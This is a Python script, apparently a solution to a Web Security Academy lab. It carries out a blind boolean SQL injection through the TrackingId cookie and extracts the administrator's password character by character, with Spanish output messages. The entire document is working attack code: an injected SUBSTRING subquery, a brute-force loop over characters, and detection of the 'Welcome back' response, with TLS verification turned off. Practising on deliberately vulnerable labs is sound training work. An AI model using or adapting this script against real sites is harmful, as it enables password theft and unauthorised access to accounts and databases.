import requests

url = "https://0a7800ff0392310d80cb261f00f400f5.web-security-academy.net/"
session_cookie = "mc0qFJn1mqsrkzFnDCKyrbOCkPz1Y2Z4"
tracking_id = "z7GtB3odIbp8dxxK"
caracteres = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print("Iniciando extracción de contraseña...")

for posicion in range(1, 21):
    for caracter in caracteres:
        payload = f"{tracking_id}' AND (SELECT SUBSTRING(password,{posicion},1) FROM users WHERE username='administrator')='{caracter}"
        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }
        response = requests.get(url, cookies=cookies, verify=False)
        if "Welcome back" in response.text:
            password += caracter
            print(f"Posicion {posicion}: '{caracter}' → {password}")
            break

print(f"\nContraseña completa: {password}")
